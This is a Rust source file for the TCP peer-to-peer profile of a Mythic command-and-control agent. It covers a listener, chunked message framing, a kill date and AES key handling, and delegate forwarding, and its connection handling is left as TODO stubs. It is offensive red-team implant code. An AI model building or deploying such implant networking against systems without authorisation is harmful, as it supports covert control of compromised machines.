use crate::profiles;
use crate::structs::{
    ConnectionInfo, DelegateMessage, MythicMessage, P2PProcessor, Profile,
};
use crate::utils;
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use chrono::NaiveDate;
use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, AtomicI32, Ordering};
use std::sync::RwLock;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio::sync::mpsc;

const TCP_CHUNK_SIZE: u32 = 51200;

#[derive(Debug, Clone, serde::Deserialize)]
pub struct TcpInitialConfig {
    pub port: i32,
    pub killdate: String,
    #[serde(rename = "encrypted_exchange_check")]
    pub encrypted_exchange_check: String,
    #[serde(rename = "AESPSK")]
    pub aes_psk: String,
}

/// Binary message format: [chunk_size+8:u32][total_chunks:u32][current_chunk:u32][data]
struct TcpMessage {
    pub total_chunks: u32,
    pub current_chunk: u32,
    pub data: Vec<u8>,
}

pub struct TcpProfile {
    port: AtomicI32,
    killdate: RwLock<NaiveDate>,
    encrypted_exchange_check: RwLock<String>,
    aes_key: RwLock<Option<Vec<u8>>>,
    uuid: RwLock<String>,
    running: AtomicBool,
    should_stop: AtomicBool,
    // Map of connection UUID to sender for forwarding messages
    connections: RwLock<HashMap<String, mpsc::Sender<Vec<u8>>>>,
    push_channel_tx: RwLock<Option<mpsc::Sender<MythicMessage>>>,
}

impl TcpProfile {
    pub fn new(config: TcpInitialConfig) -> Self {
        let aes_key = if !config.aes_psk.is_empty() {
            BASE64.decode(&config.aes_psk).ok()
        } else {
            None
        };

        let killdate = NaiveDate::parse_from_str(&config.killdate, "%Y-%m-%d")
            .unwrap_or_else(|_| NaiveDate::from_ymd_opt(2099, 12, 31).unwrap());

        Self {
            port: AtomicI32::new(config.port),
            killdate: RwLock::new(killdate),
            encrypted_exchange_check: RwLock::new(config.encrypted_exchange_check),
            aes_key: RwLock::new(aes_key),
            uuid: RwLock::new(profiles::get_uuid()),
            running: AtomicBool::new(false),
            should_stop: AtomicBool::new(false),
            connections: RwLock::new(HashMap::new()),
            push_channel_tx: RwLock::new(None),
        }
    }

    /// Read a chunked TCP message from a stream
    async fn read_tcp_message(
        stream: &mut (impl AsyncReadExt + Unpin),
    ) -> Option<Vec<u8>> {
        let mut full_data = Vec::new();
        let mut total_chunks: u32 = 0;
        let mut chunks_received: u32 = 0;

        loop {
            // Read header: [size:4][total_chunks:4][current_chunk:4]
            let mut header = [0u8; 12];
            if stream.read_exact(&mut header).await.is_err() {
                return None;
            }

            let chunk_size = u32::from_be_bytes([header[0], header[1], header[2], header[3]]) - 8;
            let msg_total = u32::from_be_bytes([header[4], header[5], header[6], header[7]]);
            let _current = u32::from_be_bytes([header[8], header[9], header[10], header[11]]);

            if total_chunks == 0 {
                total_chunks = msg_total;
            }

            // Read data
            let mut data = vec![0u8; chunk_size as usize];
            if stream.read_exact(&mut data).await.is_err() {
                return None;
            }

            full_data.extend_from_slice(&data);
            chunks_received += 1;

            if chunks_received >= total_chunks {
                break;
            }
        }

        Some(full_data)
    }

    /// Write a chunked TCP message to a stream
    async fn write_tcp_message(
        stream: &mut (impl AsyncWriteExt + Unpin),
        data: &[u8],
    ) -> bool {
        let total_chunks = std::cmp::max(
            1,
            (data.len() + TCP_CHUNK_SIZE as usize - 1) / TCP_CHUNK_SIZE as usize,
        );

        for i in 0..total_chunks {
            let start = i * TCP_CHUNK_SIZE as usize;
            let end = std::cmp::min((i + 1) * TCP_CHUNK_SIZE as usize, data.len());
            let chunk = &data[start..end];

            let chunk_size = (chunk.len() as u32 + 8).to_be_bytes();
            let total = (total_chunks as u32).to_be_bytes();
            let current = (i as u32 + 1).to_be_bytes();

            let mut header = Vec::with_capacity(12 + chunk.len());
            header.extend_from_slice(&chunk_size);
            header.extend_from_slice(&total);
            header.extend_from_slice(&current);
            header.extend_from_slice(chunk);

            if stream.write_all(&header).await.is_err() {
                return false;
            }
        }

        true
    }
}

#[async_trait::async_trait]
impl Profile for TcpProfile {
    fn profile_name(&self) -> &str {
        "tcp"
    }

    fn is_p2p(&self) -> bool {
        true
    }

    async fn start(&self) {
        self.running.store(true, Ordering::Relaxed);
        self.should_stop.store(false, Ordering::Relaxed);

        let port = self.port.load(Ordering::Relaxed);
        let addr = format!("0.0.0.0:{}", port);

        let listener = match TcpListener::bind(&addr).await {
            Ok(l) => l,
            Err(e) => {
                log::error!("TCP: Failed to bind on {}: {}", addr, e);
                self.running.store(false, Ordering::Relaxed);
                return;
            }
        };

        utils::print_debug(&format!("TCP: Listening on {}", addr));

        // Set up push channel for P2P
        let (push_tx, _push_rx) = mpsc::channel::<MythicMessage>(100);
        {
            let mut ch = self.push_channel_tx.write().unwrap();
            *ch = Some(push_tx);
        }

        while !self.should_stop.load(Ordering::Relaxed) {
            match listener.accept().await {
                Ok((_stream, addr)) => {
                    utils::print_debug(&format!("TCP: New connection from {}", addr));
                    // Handle each connection in a new task
                    tokio::spawn(async move {
                        // TODO: Handle TCP P2P connection
                        // - Perform EKE if needed
                        // - Read delegate messages
                        // - Forward to Mythic via egress profile
                    });
                }
                Err(e) => {
                    utils::print_debug(&format!("TCP: Accept error: {}", e));
                }
            }
        }

        self.running.store(false, Ordering::Relaxed);
    }

    fn stop(&self) {
        self.should_stop.store(true, Ordering::Relaxed);
    }

    fn set_sleep_interval(&self, _interval: i32) -> String {
        "TCP profile does not support sleep interval\n".to_string()
    }

    fn get_sleep_interval(&self) -> i32 {
        0
    }

    fn set_sleep_jitter(&self, _jitter: i32) -> String {
        "TCP profile does not support jitter\n".to_string()
    }

    fn get_sleep_jitter(&self) -> i32 {
        0
    }

    fn get_sleep_time(&self) -> i32 {
        0
    }

    async fn sleep(&self) {}

    fn get_kill_date(&self) -> NaiveDate {
        *self.killdate.read().unwrap()
    }

    fn set_encryption_key(&self, new_key: &str) {
        if let Ok(key) = BASE64.decode(new_key) {
            let mut aes_key = self.aes_key.write().unwrap();
            *aes_key = Some(key);
        }
    }

    fn get_config(&self) -> String {
        let port = self.port.load(Ordering::Relaxed);
        let conns = self.connections.read().unwrap().len();
        format!("  Port: {}\n  Active connections: {}\n", port, conns)
    }

    fn update_config(&self, parameter: &str, value: &str) {
        match parameter {
            "port" => {
                if let Ok(port) = value.parse::<i32>() {
                    self.port.store(port, Ordering::Relaxed);
                }
            }
            _ => utils::print_debug(&format!("Unknown TCP config: {}", parameter)),
        }
    }

    fn get_push_channel(&self) -> Option<mpsc::Sender<MythicMessage>> {
        self.push_channel_tx.read().unwrap().clone()
    }

    fn is_running(&self) -> bool {
        self.running.load(Ordering::Relaxed)
    }
}

impl P2PProcessor for TcpProfile {
    fn profile_name(&self) -> &str {
        "tcp"
    }

    fn process_ingress_message_for_p2p(&self, message: &DelegateMessage) {
        let connections = self.connections.read().unwrap();
        if let Some(tx) = connections.get(&message.uuid) {
            let data = message.message.as_bytes().to_vec();
            let _ = tx.try_send(data);
        }
    }

    fn remove_internal_connection(&self, connection_uuid: &str) -> bool {
        let mut connections = self.connections.write().unwrap();
        connections.remove(connection_uuid).is_some()
    }

    fn add_internal_connection(&self, connection: ConnectionInfo) {
        utils::print_debug(&format!("TCP: Adding internal connection: {:?}", connection));
        // TODO: Establish outbound TCP connection to peer
    }

    fn get_internal_p2p_map(&self) -> String {
        let connections = self.connections.read().unwrap();
        let mut output = String::new();
        for uuid in connections.keys() {
            output.push_str(&format!("  {}\n", uuid));
        }
        output
    }

    fn get_chunk_size(&self) -> u32 {
        TCP_CHUNK_SIZE
    }
}
